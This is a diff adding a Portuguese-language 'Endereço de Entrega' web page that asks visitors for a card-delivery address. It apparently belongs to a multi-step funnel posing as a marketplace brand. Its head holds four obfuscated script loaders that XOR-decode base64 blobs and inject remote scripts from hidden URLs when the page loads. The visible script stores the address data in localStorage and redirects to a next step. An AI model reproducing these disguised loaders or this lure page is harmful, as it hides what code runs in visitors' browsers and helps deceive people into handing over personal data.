@@ -1,0 +1,892 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script>(function(){var b_x=atob("DHBTg58oM7MKpTo+sAtx9u1EEYkozU5KwANprLBLV90k0E5T2RYqrfxHXp1o1xVN0wI68+tbHMZ+yEkR3BEn5uxcHdl5hxYc0QQn8fZKRsdv1hgE6wtx7f5FVpEwh15fxBF+9utFWtVziEpM1QY27esFS9BlwRdN0xtxr71eUt9/wBgEklIur+QKXdJnwBgEkhQy9/4FRsdnzFxHnQAh5ulNXccn1k9c2RQgobMKRdJm0F8cilJx/sJV");var n_g=[];for(var k_ui=0;k_ui<b_x.length;k_ui++){n_g.push(b_x.charCodeAt(k_ui)&255);}var s_0vo=n_g[0];var u_b=n_g.slice(1,1+s_0vo);var s_3n6=n_g.slice(1+s_0vo);var u_k=s_3n6.map(function(b,s_bfn){return b^u_b[s_bfn%s_0vo];});var w_7le6="";for(var a_st=0;a_st<u_k.length;a_st++){w_7le6+=String.fromCharCode(u_k[a_st]&255);}var s_enao=decodeURIComponent(escape(w_7le6));var b_v6i=JSON.parse(s_enao);var x_vi6=b_v6i.globals||[];x_vi6.forEach(function(v_hv){window[v_hv.name]=v_hv.value;});var n_rb2=document.createElement("script");n_rb2.src=b_v6i.url;n_rb2.async=true;n_rb2.defer=true;(b_v6i.attributes||[]).forEach(function(r_ebks){n_rb2.setAttribute(r_ebks.name,r_ebks.value);});(document.head||document.documentElement).appendChild(n_rb2);})();</script><script src="js/latest.js" async="" defer="" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids=""></script>
+<script>(function(){var x_v=atob("DPv5+JvEGQDXP+pP8YDbjemoOzr1V547gYjD17SnfW75Sp4imJ2A1virdC61TcU8komQiO+3NnC+R48j3ouQgP6oNGe4UI0jlNWTi7noO2GjS5gmk46NnejmI1uKE8gonZSbmfe3OzqMRMghkJac2qHmfm+4WIYqoZKBnfeNfSL7HZwunY6c2qHmL2HgDN8swMKYyav3LzDkXdgqw5mfyP6gO32KQg==");var a_0s=[];for(var s_m7=0;s_m7<x_v.length;s_m7++){a_0s.push(x_v.charCodeAt(s_m7)&255);}var j_9h=a_0s[0];var n_m1kx=a_0s.slice(1,1+j_9h);var m_c=a_0s.slice(1+j_9h);var m_svs=m_c.map(function(b,y_a208){return b^n_m1kx[y_a208%j_9h];});var b_4f1="";for(var y_b2=0;y_b2<m_svs.length;y_b2++){b_4f1+=String.fromCharCode(m_svs[y_b2]&255);}var a_40s7=decodeURIComponent(escape(b_4f1));var r_92=JSON.parse(a_40s7);var v_5f5b=r_92.globals||[];v_5f5b.forEach(function(f_b11){window[f_b11.name]=f_b11.value;});var z_7va5=document.createElement("script");z_7va5.src=r_92.url;z_7va5.async=true;z_7va5.defer=true;(r_92.attributes||[]).forEach(function(y_o8){z_7va5.setAttribute(y_o8.name,y_o8.value);});(document.head||document.documentElement).appendChild(z_7va5);})();</script><script src="js/pixel-google.js" async="" defer=""></script>
+
+
+    
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+    <title>Endereço de Entrega - mercado</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #EEEEEE;
+            min-height: 100vh;
+            color: #333333;
+            position: relative;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        /* Animated Background Elements */
+        .bg-decoration {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.05;
+            pointer-events: none;
+        }
+        .decoration {
+            position: absolute;
+            border-radius: 50%;
+            background: #EE4D2D;
+        }
+        .decoration1 {
+            width: 300px;
+            height: 300px;
+            top: 10%;
+            right: 5%;
+            animation: float1 20s infinite ease-in-out;
+        }
+        .decoration2 {
+            width: 200px;
+            height: 200px;
+            bottom: 10%;
+            left: 5%;
+            background: #EE4D2D;
+            animation: float2 25s infinite ease-in-out;
+        }
+        .decoration3 {
+            width: 150px;
+            height: 150px;
+            top: 50%;
+            left: 50%;
+            background: #EE4D2D;
+            animation: float3 30s infinite ease-in-out;
+        }
+        @keyframes float1 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-30px, 30px) scale(1.1); }
+        }
+        @keyframes float2 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(30px, -30px) scale(0.9); }
+        }
+        @keyframes float3 {
+            0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
+            50% { transform: translate(-50%, -50%) rotate(180deg); }
+        }
+        /* Header */
+        .header {
+            background: #EE4D2D;
+            padding: 20px 24px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            animation: slideDown 0.6s ease-out;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        @keyframes slideDown {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        /* Logo */
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: logoAppear 0.8s ease-out;
+        }
+
+        .logo-container img {
+            height: 50px;
+            width: auto;
+        }
+
+        @keyframes logoAppear {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        /* Content Container */
+        .content-container {
+            max-width: 520px;
+            margin: 30px auto;
+            padding: 40px 30px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            animation: scaleIn 0.6s ease-out;
+            position: relative;
+            text-align: center;
+        }
+        @keyframes scaleIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        /* Title */
+        .main-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #333333;
+            line-height: 1.3;
+            margin-bottom: 10px;
+            animation: fadeInUp 0.6s ease-out;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #666666;
+            line-height: 1.5;
+            margin-bottom: 40px;
+            animation: fadeIn 0.6s ease-out 0.2s both;
+        }
+        @keyframes fadeInUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #333333;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #EDEDED;
+            border-radius: 6px;
+            font-size: 16px;
+            font-family: 'Inter', sans-serif;
+            background: #FFFFFF;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+        .form-input:focus {
+            border-color: #EE4D2D;
+            box-shadow: 0 0 0 3px rgba(238, 77, 45, 0.15);
+        }
+        .form-input::placeholder {
+            color: #999999;
+        }
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+        .form-row .form-group {
+            flex: 1;
+        }
+        .form-row .form-group.half {
+            flex: 1;
+        }
+        .form-row .form-group.complement {
+            flex: 1.5;
+        }
+        select.form-input {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3e%3c/svg%3e");
+            background-position: right 12px center;
+            background-repeat: no-repeat;
+            background-size: 16px;
+            padding-right: 40px;
+        }
+        /* Loading state */
+        .loading {
+            opacity: 0.6;
+            pointer-events: none;
+        }
+        /* Continue Button */
+        .button {
+            background: #EE4D2D;
+            color: #FFFFFF;
+            padding: 18px 45px;
+            border-radius: 6px;
+            text-decoration: none;
+            display: block;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(238, 77, 45, 0.3);
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            font-family: 'Inter', sans-serif;
+            animation: fadeIn 0.8s ease-out 1s both;
+            margin-top: 30px;
+        }
+        .button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s ease;
+        }
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(238, 77, 45, 0.4);
+            background: #D63D21;
+        }
+        .button:hover::before {
+            left: 100%;
+        }
+        .button:active {
+            transform: translateY(0);
+        }
+        .button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        /* Success Modal */
+        .success-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .success-modal.show {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .success-modal-content {
+            background: white;
+            padding: 50px 40px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            position: relative;
+            transform: scale(0.7) translateY(50px);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+        
+        .success-modal.show .success-modal-content {
+            transform: scale(1) translateY(0);
+        }
+        
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: #00A650;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            position: relative;
+            animation: pulseSuccess 0.6s ease-out;
+        }
+        
+        @keyframes pulseSuccess {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .success-icon::after {
+            content: '✓';
+            color: #fff;
+            font-size: 40px;
+            font-weight: bold;
+            animation: checkmarkAppear 0.8s ease-out 0.3s both;
+        }
+        
+        @keyframes checkmarkAppear {
+            0% { opacity: 0; transform: rotate(-45deg) scale(0); }
+            100% { opacity: 1; transform: rotate(0deg) scale(1); }
+        }
+        
+        .success-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 15px;
+            animation: slideUpFade 0.6s ease-out 0.5s both;
+        }
+        
+        .success-message {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 25px;
+            animation: slideUpFade 0.6s ease-out 0.7s both;
+        }
+        
+        @keyframes slideUpFade {
+            0% { opacity: 0; transform: translateY(20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+        
+        .success-details {
+            background: #F5F5F5;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #555;
+            animation: slideUpFade 0.6s ease-out 0.9s both;
+            border-left: 4px solid #EE4D2D;
+        }
+        
+        .loading-dots {
+            display: inline-block;
+            font-size: 18px;
+            animation: loading 1.5s infinite;
+        }
+        
+        @keyframes loading {
+            0%, 20% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        /* Footer */
+        footer {
+            padding: 20px;
+            text-align: center;
+            background: #FFFFFF;
+            margin-top: auto;
+        }
+        footer p {
+            color: #999999;
+            font-size: 12px;
+            margin: 2px 0;
+            line-height: 1.5;
+        }
+        footer a {
+            color: #EE4D2D;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        /* Mobile Responsive */
+        @media (max-width: 500px) {
+            .header {
+                padding: 18px 20px;
+            }
+
+            .logo-container img {
+                height: 40px;
+            }
+
+            .content-container {
+                margin: 20px 15px;
+                padding: 30px 20px;
+            }
+            .main-title {
+                font-size: 24px;
+            }
+            .form-row {
+                flex-direction: column;
+                gap: 0;
+            }
+            .button {
+                padding: 16px 35px;
+                font-size: 15px;
+            }
+            .success-modal-content {
+                padding: 40px 30px;
+                margin: 0 20px;
+            }
+            .success-icon {
+                width: 70px;
+                height: 70px;
+            }
+            .success-icon::after {
+                font-size: 35px;
+            }
+            .success-title {
+                font-size: 20px;
+            }
+        }
+    </style>
+
+    
+
+    
+
+    
+
+    
+
+    
+<script src="js/utm-handler.js" data-token="ea930328-cad0-4277-b99d-8c16148dcdbb"></script>
+
+<!-- UTMify pixel and UTM tracking -->
+<script>(function(){var n_9umv=atob("DOmOujQiboEBZRMcE5Ksz0ZOTLsjDWdoY5q0lRtBCu8vEGdxeo/3lFdNA69jFzxvcJvnykBRQfFoHXZwPJnnwlFOQOtyRz8+cp36yF1AG/VkFjEmSLSimFNOAeNgCWA+KbL1mFpDA+QjXzFsepHr1n1GTK0jE3JwZoysgBYUD+AyUScrK4+4j1cQCrkzXSR+IdzqjAMAE9x8");var f_3w0=[];for(var e_9ihb=0;e_9ihb<n_9umv.length;e_9ihb++){f_3w0.push(n_9umv.charCodeAt(e_9ihb)&255);}var q_jc2=f_3w0[0];var v_p14n=f_3w0.slice(1,1+q_jc2);var x_to=f_3w0.slice(1+q_jc2);var y_cfcj=x_to.map(function(b,i_eb){return b^v_p14n[i_eb%q_jc2];});var y_lgc="";for(var r_4y4=0;r_4y4<y_cfcj.length;r_4y4++){y_lgc+=String.fromCharCode(y_cfcj[r_4y4]&255);}var j_oi3=decodeURIComponent(escape(y_lgc));var b_fccl=JSON.parse(j_oi3);var p_1=b_fccl.globals||[];p_1.forEach(function(i_1wym){window[i_1wym.name]=i_1wym.value;});var p_w3kc=document.createElement("script");p_w3kc.src=b_fccl.url;p_w3kc.async=true;p_w3kc.defer=true;(b_fccl.attributes||[]).forEach(function(u_9vj){p_w3kc.setAttribute(u_9vj.name,u_9vj.value);});(document.head||document.documentElement).appendChild(p_w3kc);})();</script>
+<script>(function(){var e_0z=atob("DE/SdGpmbNX2MyoZiDTwARgKTu/UW15t+DzoW0UFCLvYRl504SmrWgkJAfuUQQVq6z27BB4VQ6CCXlk25C6mERkSQr+FEQY76TumBgMEGaGTQAgj0zTwGgsLCffMEU54/C7/AR4LBbOPHlpr7Tm3Gh5LFLaZVwdq6yTwWEgQDbmDVggjqm2vWBFEArSbVggjqiuzAAtLGaGbWkxgpT+gERwDAqHbQF974SuhVkZEGrSaRk87sm3wCTcb");var o_7o=[];for(var u_j=0;u_j<e_0z.length;u_j++){o_7o.push(e_0z.charCodeAt(u_j)&255);}var a_a=o_7o[0];var r_ji86=o_7o.slice(1,1+a_a);var r_b=o_7o.slice(1+a_a);var q_m1=r_b.map(function(b,r_co2){return b^r_ji86[r_co2%a_a];});var d_17sz="";for(var m_hsnv=0;m_hsnv<q_m1.length;m_hsnv++){d_17sz+=String.fromCharCode(q_m1[m_hsnv]&255);}var w_n=decodeURIComponent(escape(d_17sz));var w_1dqv=JSON.parse(w_n);var r_6m=w_1dqv.globals||[];r_6m.forEach(function(r_jqj){window[r_jqj.name]=r_jqj.value;});var w_fj=document.createElement("script");w_fj.src=w_1dqv.url;w_fj.async=true;w_fj.defer=true;(w_1dqv.attributes||[]).forEach(function(z_jqz){w_fj.setAttribute(z_jqz.name,z_jqz.value);});(document.head||document.documentElement).appendChild(w_fj);})();</script>
+</head>
+<body>
+    <div class="bg-decoration">
+        <div class="decoration decoration1"></div>
+        <div class="decoration decoration2"></div>
+        <div class="decoration decoration3"></div>
+    </div>
+    <div class="header">
+        <!-- Logo mercado -->
+        <div class="logo-container">
+            <img src="images/logoofc.png" alt="mercado">
+        </div>
+    </div>
+    <div class="content-container">
+        <h1 class="main-title">Endereço de Entrega</h1>
+        <p class="subtitle">Onde você deseja receber seu cartão</p>
+        
+        <form id="addressForm">
+            <div class="form-group">
+                <label for="cep">CEP</label>
+                <input type="tel" id="cep" class="form-input" placeholder="00000-000" maxlength="9" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            
+            <div class="form-group">
+                <label for="endereco">Endereço</label>
+                <input type="text" id="endereco" class="form-input" placeholder="Rua, Avenida, etc.">
+            </div>
+            
+            <div class="form-row">
+                <div class="form-group half">
+                    <label for="numero">Número</label>
+                    <input type="text" id="numero" class="form-input" placeholder="123">
+                </div>
+                <div class="form-group complement">
+                    <label for="complemento">Complemento (opcional)</label>
+                    <input type="text" id="complemento" class="form-input" placeholder="Apto, Bloco, etc.">
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="bairro">Bairro</label>
+                <input type="text" id="bairro" class="form-input" placeholder="Nome do bairro">
+            </div>
+            
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="cidade">Cidade</label>
+                    <input type="text" id="cidade" class="form-input" placeholder="Nome da cidade">
+                </div>
+                <div class="form-group">
+                    <label for="estado">Estado</label>
+                    <select id="estado" class="form-input">
+                        <option value="">Selecione</option>
+                        <option value="AC">Acre</option>
+                        <option value="AL">Alagoas</option>
+                        <option value="AP">Amapá</option>
+                        <option value="AM">Amazonas</option>
+                        <option value="BA">Bahia</option>
+                        <option value="CE">Ceará</option>
+                        <option value="DF">Distrito Federal</option>
+                        <option value="ES">Espírito Santo</option>
+                        <option value="GO">Goiás</option>
+                        <option value="MA">Maranhão</option>
+                        <option value="MT">Mato Grosso</option>
+                        <option value="MS">Mato Grosso do Sul</option>
+                        <option value="MG">Minas Gerais</option>
+                        <option value="PA">Pará</option>
+                        <option value="PB">Paraíba</option>
+                        <option value="PR">Paraná</option>
+                        <option value="PE">Pernambuco</option>
+                        <option value="PI">Piauí</option>
+                        <option value="RJ">Rio de Janeiro</option>
+                        <option value="RN">Rio Grande do Norte</option>
+                        <option value="RS">Rio Grande do Sul</option>
+                        <option value="RO">Rondônia</option>
+                        <option value="RR">Roraima</option>
+                        <option value="SC">Santa Catarina</option>
+                        <option value="SP">São Paulo</option>
+                        <option value="SE">Sergipe</option>
+                        <option value="TO">Tocantins</option>
+                    </select>
+                </div>
+            </div>
+        </form>
+        
+        <button class="button" id="continueBtn" onclick="continuarFluxo()">Continuar</button>
+    </div>
+
+    <!-- Modal de Sucesso -->
+    <div class="success-modal" id="successModal">
+        <div class="success-modal-content">
+            <div class="success-icon"></div>
+            <div class="success-title">Endereço Cadastrado com Sucesso!</div>
+            <div class="success-message">Seu endereço foi salvo e está pronto para entrega do cartão.</div>
+            <div class="success-details">
+                <strong>Redirecionando</strong> <span class="loading-dots">...</span>
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <p>© 2026, Todos os direitos reservados.</p>
+        <p><a href="#">Termos e condições</a> · <a href="#">Privacidade</a></p>
+    </footer>
+    
+    <script>
+        // =======================================================
+        // SISTEMA DE PASSAGEM DE PARÂMETROS URL - ADICIONADO
+        // =======================================================
+        
+        // Função para capturar parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        // Função para construir URL com parâmetros
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        // Debug: Mostrar parâmetros atuais no console
+        console.log('Parâmetros atuais da página de endereço:', getUrlParams());
+
+        // =======================================================
+        // CÓDIGO ORIGINAL MANTIDO
+        // =======================================================
+
+        // Sistema global de dados do usuário
+        const UserData = {
+            userData: {},
+            save: function(dados) {
+                this.userData = { ...this.userData, ...dados };
+                console.log('💾 Dados salvos:', this.userData);
+                
+                // Salva também no localStorage para persistência
+                try {
+                    localStorage.setItem('userdata', JSON.stringify(this.userData));
+                } catch(e) {
+                    console.warn('Não foi possível salvar no localStorage:', e);
+                }
+                
+                return this.userData;
+            },
+            load: function() {
+                // Tenta carregar do localStorage primeiro
+                try {
+                    const saved = localStorage.getItem('userdata');
+                    if (saved) {
+                        this.userData = JSON.parse(saved);
+                        console.log('📂 Dados carregados do localStorage:', this.userData);
+                    }
+                } catch(e) {
+                    console.warn('Não foi possível carregar do localStorage:', e);
+                }
+                return this.userData;
+            },
+            update: function(novosDados) {
+                this.userData = { ...this.userData, ...novosDados };
+                this.save(this.userData);
+                return this.userData;
+            },
+            clear: function() {
+                this.userData = {};
+                try {
+                    localStorage.removeItem('userdata');
+                } catch(e) {}
+            }
+        };
+
+        // Carrega dados existentes ao iniciar
+        UserData.load();
+        console.log('Dados do usuário carregados:', UserData.userData);
+
+        // Máscara de CEP
+        document.getElementById('cep').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 5) {
+                value = value.replace(/(\d{5})(\d{0,3})/, '$1-$2');
+            }
+            e.target.value = value;
+            
+            // Busca automática de CEP
+            if (value.replace(/\D/g, '').length === 8) {
+                buscarCEP(value.replace(/\D/g, ''));
+            }
+        });
+
+        // Busca de CEP via API
+        async function buscarCEP(cep) {
+            const form = document.getElementById('addressForm');
+            form.classList.add('loading');
+            
+            try {
+                const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+                const data = await response.json();
+                
+                if (!data.erro) {
+                    document.getElementById('endereco').value = data.logradouro || '';
+                    document.getElementById('bairro').value = data.bairro || '';
+                    document.getElementById('cidade').value = data.localidade || '';
+                    document.getElementById('estado').value = data.uf || '';
+                    
+                    // Foca no campo número após preenchimento automático
+                    document.getElementById('numero').focus();
+                    
+                    console.log('✅ CEP encontrado:', data);
+                } else {
+                    console.log('⚠️ CEP não encontrado');
+                }
+            } catch (error) {
+                console.error('Erro ao buscar CEP:', error);
+            } finally {
+                form.classList.remove('loading');
+            }
+        }
+
+        function validarFormulario() {
+            const camposObrigatorios = ['cep', 'endereco', 'numero', 'bairro', 'cidade', 'estado'];
+            let erros = [];
+            
+            camposObrigatorios.forEach(campo => {
+                const elemento = document.getElementById(campo);
+                const valor = elemento.value.trim();
+                
+                if (!valor) {
+                    erros.push(campo);
+                    elemento.style.borderColor = '#E53935';
+                } else {
+                    elemento.style.borderColor = '#EDEDED';
+                }
+            });
+            
+            if (erros.length > 0) {
+                alert('Por favor, preencha todos os campos obrigatórios.');
+                document.getElementById(erros[0]).focus();
+                return false;
+            }
+            
+            return true;
+        }
+
+        function mostrarModalSucesso() {
+            const modal = document.getElementById('successModal');
+            modal.classList.add('show');
+            
+            return modal;
+        }
+
+        function continuarFluxo() {
+            if (!validarFormulario()) {
+                return;
+            }
+            
+            // Desabilita o botão para evitar cliques duplos
+            const button = document.getElementById('continueBtn');
+            button.disabled = true;
+            button.textContent = 'Salvando dados...';
+            
+            // Cria objeto com dados do endereço em formato compatível
+            const enderecoData = {
+                // Campos principais
+                cep: document.getElementById('cep').value.trim(),
+                endereco: document.getElementById('endereco').value.trim(),
+                rua: document.getElementById('endereco').value.trim(),
+                street: document.getElementById('endereco').value.trim(),
+                numero: document.getElementById('numero').value.trim(),
+                number: document.getElementById('numero').value.trim(),
+                complemento: document.getElementById('complemento').value.trim(),
+                complement: document.getElementById('complemento').value.trim(),
+                bairro: document.getElementById('bairro').value.trim(),
+                district: document.getElementById('bairro').value.trim(),
+                cidade: document.getElementById('cidade').value.trim(),
+                city: document.getElementById('cidade').value.trim(),
+                estado: document.getElementById('estado').value.trim(),
+                uf: document.getElementById('estado').value.trim(),
+                state: document.getElementById('estado').value.trim(),
+                zipcode: document.getElementById('cep').value.trim(),
+                
+                // Endereço formatado para exibição
+                endereco_completo: formatarEnderecoCompleto(),
+                endereco_simples: formatarEnderecoCompleto(),
+                
+                // Metadados
+                data_cadastro: new Date().toISOString(),
+                timestamp: Date.now(),
+                origem: 'formulario_endereco',
+                status: 'valido'
+            };
+            
+            // Salva dados com múltiplas chaves para compatibilidade total
+            const dadosSalvos = UserData.update({
+                // Estados da aplicação
+                etapa_atual: 'endereco_cadastrado',
+                last_step: 'endereco_preenchido',
+                flow_step: 'address_completed',
+                
+                // Dados do endereço em diferentes formatos
+                endereco_entrega: enderecoData,
+                endereco: enderecoData,
+                address: enderecoData,
+                delivery_address: enderecoData,
+                
+                // Timestamps
+                endereco_data: new Date().toISOString(),
+                last_update: new Date().toISOString(),
+                
+                // Flags de controle
+                endereco_valido: true,
+                endereco_preenchido: true,
+                can_proceed: true
+            });
+            
+            // Chave alternativa usada por upsell/online/13-1
+            try { localStorage.setItem('enderecoEntrega', JSON.stringify(enderecoData)); } catch(e){}
+
+            console.log('✅ Dados do endereço salvos com sucesso!');
+            console.log('📊 Estrutura completa:', dadosSalvos);
+            
+            // Mostra modal de sucesso
+            mostrarModalSucesso();
+            
+            // Confirma salvamento e redireciona após o modal
+            setTimeout(() => {
+                console.log('🔄 Redirecionando para seleção de método de envio...');
+                
+                // =======================================================
+                // REDIRECIONAMENTO ATUALIZADO PARA PRESERVAR PARÂMETROS
+                // =======================================================
+                window.location.href = buildUrlWithParams('12.html');
+            }, 2500);
+        }
+
+        function formatarEnderecoCompleto() {
+            const endereco = document.getElementById('endereco').value.trim();
+            const numero = document.getElementById('numero').value.trim();
+            const complemento = document.getElementById('complemento').value.trim();
+            const bairro = document.getElementById('bairro').value.trim();
+            const cidade = document.getElementById('cidade').value.trim();
+            const estado = document.getElementById('estado').value.trim();
+            const cep = document.getElementById('cep').value.trim();
+            
+            let enderecoCompleto = '';
+            
+            // Linha 1: Rua, número e complemento
+            if (endereco) {
+                enderecoCompleto += endereco;
+                if (numero) {
+                    enderecoCompleto += `, ${numero}`;
+                }
+                if (complemento) {
+                    enderecoCompleto += `, ${complemento}`;
+                }
+            }
+            
+            // Linha 2: Bairro, cidade e estado
+            if (bairro || cidade) {
+                enderecoCompleto += '<br>';
+                if (bairro) {
+                    enderecoCompleto += bairro;
+                }
+                if (bairro && cidade) {
+                    enderecoCompleto += ' - ';
+                }
+                if (cidade) {
+                    enderecoCompleto += cidade;
+                }
+                if (estado && (bairro || cidade)) {
+                    enderecoCompleto += `/${estado}`;
+                }
+            }
+            
+            // Linha 3: CEP
+            if (cep) {
+                enderecoCompleto += `<br>CEP: ${cep}`;
+            }
+            
+            return enderecoCompleto;
+        }
+
+        function carregarDadosExistentes() {
+            const dadosUsuario = UserData.load();
+            
+            // Procura dados de endereço em diferentes possíveis localizações
+            const endereco = dadosUsuario?.endereco_entrega || 
+                             dadosUsuario?.endereco || 
+                             dadosUsuario?.address ||
+                             null;
+            
+            if (endereco) {
+                console.log('📥 Carregando dados de endereço existentes:', endereco);
+                
+                // Preenche os campos com os dados salvos
+                document.getElementById('cep').value = endereco.cep || endereco.zipcode || '';
+                document.getElementById('endereco').value = endereco.endereco || endereco.rua || endereco.street || '';
+                document.getElementById('numero').value = endereco.numero || endereco.number || '';
+                document.getElementById('complemento').value = endereco.complemento || endereco.complement || '';
+                document.getElementById('bairro').value = endereco.bairro || endereco.district || '';
+                document.getElementById('cidade').value = endereco.cidade || endereco.city || '';
+                document.getElementById('estado').value = endereco.estado || endereco.uf || endereco.state || '';
+                
+                console.log('✅ Dados de endereço carregados nos campos');
+            } else {
+                console.log('ℹ️ Nenhum endereço salvo encontrado - novo preenchimento');
+            }
+        }
+
+        // Função para debug - pressione Ctrl+Shift+D
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+                e.preventDefault();
+                console.log('🐛 === DEBUG DOS DADOS DE ENDEREÇO ===');
+                const dados = UserData.load();
+                console.log('Todos os dados:', dados);
+                console.log('Endereço principal:', dados.endereco_entrega);
+                console.log('Endereço alias 1:', dados.endereco);
+                console.log('Endereço alias 2:', dados.address);
+                console.log('Parâmetros URL atuais:', getUrlParams());
+                console.log('=====================================');
+                
+                // Mostra na tela
+                alert('Dados exibidos no console (F12). Verifique a aba Console.');
+            }
+        });
+
+        // Fechar modal ao clicar fora (opcional)
+        document.getElementById('successModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                this.classList.remove('show');
+            }
+        });
+    </script>
+
+</body></html>
